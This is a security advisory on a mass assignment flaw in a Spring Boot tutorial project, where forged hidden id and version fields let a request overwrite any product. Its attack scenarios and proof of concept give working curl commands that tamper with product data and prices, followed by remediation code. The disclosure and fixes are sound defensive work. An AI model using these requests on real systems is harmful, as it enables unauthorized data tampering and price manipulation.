# Mass Assignment Vulnerability in Spring Boot Web Application Tutorial Project

## Vulnerability Overview

A Mass Assignment vulnerability exists in the Spring Boot Web Application tutorial project maintained by Spring Framework Guru. The vulnerability allows attackers to manipulate entity fields that should not be user-controllable, including primary keys and version numbers used for optimistic locking, by modifying HTTP request parameters.

## Affected Software

- **Product**: Spring Boot Web Application (Tutorial Project)
- **Vendor**: Spring Framework Guru (springframework.guru)
- **Repository**: https://github.com/springframeworkguru/spring-boot-web
- **Affected Versions**: All versions (current latest commit: e4f8728)
- **Vulnerable Component**: ProductController.java

## Vulnerability Details

### Root Cause

The application directly binds HTTP request parameters to JPA entity objects without field filtering. The `ProductController.saveProduct()` method accepts a `Product` entity object directly from user input:

```java
// File: src/main/java/guru/springframework/controllers/ProductController.java:48
@RequestMapping(value = "product", method = RequestMethod.POST)
public String saveProduct(Product product){
    productService.saveProduct(product);
    return "redirect:/product/" + product.getId();
}
```

The Product entity contains fields that should not be user-controllable:

```java
// File: src/main/java/guru/springframework/domain/Product.java
@Entity
public class Product {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Integer id;          // Should not be user-controllable

    @Version
    private Integer version;     // Should not be user-controllable

    private String productId;
    private String description;
    private String imageUrl;
    private BigDecimal price;
}
```

The HTML form includes hidden fields for both `id` and `version`:

```html
<!-- File: src/main/resources/templates/productform.html:16-17 -->
<input type="hidden" th:field="*{id}"/>
<input type="hidden" th:field="*{version}"/>
```

### Technical Analysis

While the entity includes a `@Version` field for optimistic locking protection, this protection can be bypassed:

1. **JPA save() Behavior**: When an entity has a non-null `@Version` field, JPA's `isNew()` method treats it as an existing entity and performs a MERGE operation instead of INSERT.

2. **Optimistic Lock Limitation**: The optimistic lock only prevents concurrent modifications when version numbers don't match. However, if an attacker obtains the correct version number, they can successfully overwrite the entity.

3. **Version Disclosure**: The version number is exposed in the HTML source code and can be easily obtained by viewing the page source or intercepting HTTP requests.

## Attack Scenarios

### Scenario 1: Cross-Product Overwrite Attack

An attacker can use one product's edit form to overwrite another product's data:

1. User accesses edit form for Product #2: `/product/edit/2`
   - Form loads with: `id=2, version=5, description="Product 2"`

2. Attacker views Product #1's details page and obtains its version number from HTML source:
   ```html
   <input type="hidden" name="version" value="3"/>
   ```

3. Attacker modifies hidden fields in Product #2's form using browser developer tools:
   - Changes `id` from `2` to `1`
   - Changes `version` from `5` to `3`

4. Upon form submission, Product #1 is overwritten with the data intended for Product #2

### Scenario 2: Direct Exploitation via HTTP Request

```bash
# Step 1: Obtain current version number
curl http://localhost:8080/product/1
# Parse HTML to find: <input type="hidden" name="version" value="0"/>

# Step 2: Craft malicious request with correct version
curl -X POST http://localhost:8080/product \
  -d "id=1" \
  -d "version=0" \
  -d "productId=hacked" \
  -d "description=Malicious Content" \
  -d "price=0.01" \
  -d "imageUrl=https://attacker.com/malicious.jpg"

# Result: Product #1 is successfully overwritten
```

## Impact Assessment

### Security Impact

1. **Data Integrity Violation**: Attackers can modify any product in the database by obtaining the correct version number
2. **Business Logic Bypass**: Price manipulation - attackers can change product prices to arbitrary values
3. **Authorization Bypass**: Users can modify products they shouldn't have access to (in scenarios where authentication is added)
4. **Audit Trail Corruption**: Changes appear to be legitimate updates, making detection difficult

### Attack Complexity

- **Attack Vector**: Network (HTTP/HTTPS)
- **Privileges Required**: None (or basic user privileges if authentication is added)
- **User Interaction**: None required for direct exploitation
- **Scope**: Unchanged
- **Technical Skill Required**: Low - only requires ability to view HTML source and modify form fields

## Proof of Concept

### Environment Setup

```bash
git clone https://github.com/springframeworkguru/spring-boot-web.git
cd spring-boot-web
mvn spring-boot:run
```

### Exploitation Steps

1. **Obtain target product's version**:
```bash
curl -s http://localhost:8080/product/1 | grep -o 'name="version" value="[0-9]*"'
# Output: name="version" value="0"
```

2. **Execute mass assignment attack**:
```bash
curl -X POST http://localhost:8080/product \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=1" \
  -d "version=0" \
  -d "productId=PWNED" \
  -d "description=Successfully exploited mass assignment" \
  -d "price=0.01" \
  -d "imageUrl=https://example.com/pwned.jpg"
```

3. **Verify exploitation**:
```bash
curl http://localhost:8080/product/1
# The product description should now show: "Successfully exploited mass assignment"
```

### Expected vs. Actual Behavior

**Expected**: Users should only be able to edit their own products, and system-managed fields (id, version) should not be modifiable through HTTP requests.

**Actual**: Any user can modify any product by manipulating form fields, including system-managed fields.

## Remediation

### Recommended Fix

Implement one of the following solutions:

#### Solution 1: Use Data Transfer Objects (Recommended)

Create a DTO that only contains editable fields:

```java
public class ProductDTO {
    private String productId;
    private String description;
    private String imageUrl;
    private BigDecimal price;
    // getters and setters only for user-editable fields
}

// Separate handlers for create and update
@RequestMapping(value = "product/new", method = RequestMethod.POST)
public String createProduct(ProductDTO productDTO) {
    Product product = new Product();
    product.setProductId(productDTO.getProductId());
    product.setDescription(productDTO.getDescription());
    product.setImageUrl(productDTO.getImageUrl());
    product.setPrice(productDTO.getPrice());
    product = productService.saveProduct(product);
    return "redirect:/product/" + product.getId();
}

@RequestMapping(value = "product/edit/{id}", method = RequestMethod.POST)
public String updateProduct(@PathVariable Integer id, ProductDTO productDTO) {
    Product product = productService.getProductById(id);
    if (product == null) {
        throw new NotFoundException("Product not found");
    }
    // Only update allowed fields
    product.setProductId(productDTO.getProductId());
    product.setDescription(productDTO.getDescription());
    product.setImageUrl(productDTO.getImageUrl());
    product.setPrice(productDTO.getPrice());
    productService.saveProduct(product);
    return "redirect:/product/" + id;
}
```

#### Solution 2: Use @InitBinder Whitelist

```java
@Controller
public class ProductController {

    @InitBinder
    public void initBinder(WebDataBinder binder) {
        // Only allow binding these fields
        binder.setAllowedFields("productId", "description", "imageUrl", "price");
    }

    @RequestMapping(value = "product", method = RequestMethod.POST)
    public String saveProduct(Product product) {
        productService.saveProduct(product);
        return "redirect:/product/" + product.getId();
    }
}
```

#### Solution 3: Get ID from Path Parameter

```java
@RequestMapping(value = "product/{id}", method = RequestMethod.POST)
public String saveProduct(@PathVariable Integer id, Product product) {
    Product existing = productService.getProductById(id);
    if (existing != null) {
        // Update existing product, preserve original id and version
        existing.setProductId(product.getProductId());
        existing.setDescription(product.getDescription());
        existing.setImageUrl(product.getImageUrl());
        existing.setPrice(product.getPrice());
        productService.saveProduct(existing);
        return "redirect:/product/" + id;
    } else {
        // New product - ensure id and version are null
        product.setId(null);
        product.setVersion(null);
        product = productService.saveProduct(product);
        return "redirect:/product/" + product.getId();
    }
}
```

### Additional Security Measures

1. **Remove hidden fields from template**:
```html
<!-- Remove these lines from productform.html -->
<!-- <input type="hidden" th:field="*{id}"/> -->
<!-- <input type="hidden" th:field="*{version}"/> -->
```

2. **Add input validation**:
```java
@RequestMapping(value = "product", method = RequestMethod.POST)
public String saveProduct(@Valid ProductDTO productDTO,
                         BindingResult result,
                         Model model) {
    if (result.hasErrors()) {
        return "productform";
    }
    // ... save logic
}
```

3. **Implement proper authorization** to ensure users can only modify products they own.

## Special Considerations

### Project Context

This vulnerability exists in a **tutorial project** designed for educational purposes. The project is from Spring Framework Guru's tutorial series "Spring Boot - making Spring Fun again!" and is intended for learning Spring Boot basics.

However, this vulnerability is still significant because:

1. **Educational Impact**: Students learning from this tutorial may replicate the vulnerable pattern in production applications
2. **Copy-Paste Risk**: Developers might use this code as a template for real-world projects
3. **Security Awareness**: Even tutorial projects should demonstrate secure coding practices

### Disclosure Rationale

While this is a tutorial project, disclosing this vulnerability serves important purposes:

1. **Educational Value**: Highlighting the vulnerability helps educate developers about Mass Assignment risks
2. **Pattern Recognition**: This vulnerable pattern is common in Spring Boot applications
3. **Best Practices**: Promotes adoption of secure coding patterns like DTO usage
4. **Community Benefit**: Helps the Spring community understand and avoid this vulnerability class

## Timeline

- **2025-01-10**: Vulnerability discovered during security audit
- **2025-01-10**: Vulnerability confirmed and validated
- **2025-01-10**: CVE application submitted

## References

1. OWASP Mass Assignment Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
2. Spring Data JPA Documentation: https://docs.spring.io/spring-data/jpa/reference/
3. CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes: https://cwe.mitre.org/data/definitions/915.html
4. Affected Repository: https://github.com/springframeworkguru/spring-boot-web
5. Spring Framework Guru Tutorial: https://springframework.guru/spring-boot-web-application-part-1-spring-initializr/

## Credits

**Discoverer**: sh7err@vEcho

## Vendor Communication Status

- [ ] Vendor notified
- [ ] Vendor acknowledged
- [ ] Fix available
- [ ] Fix verified

**Note**: As this is an open-source tutorial project, the vulnerability will be disclosed publicly to maximize educational value.

## Appendix: Related Vulnerabilities

This Mass Assignment vulnerability is particularly common in Spring Boot applications. Similar vulnerabilities have been reported:

- CVE-2022-22968: Spring Framework - Data Binding on disallowedFields Rules
- Multiple instances in production applications where entity fields are directly bound to user input

The widespread nature of this pattern makes this disclosure valuable for the broader Spring Boot developer community.
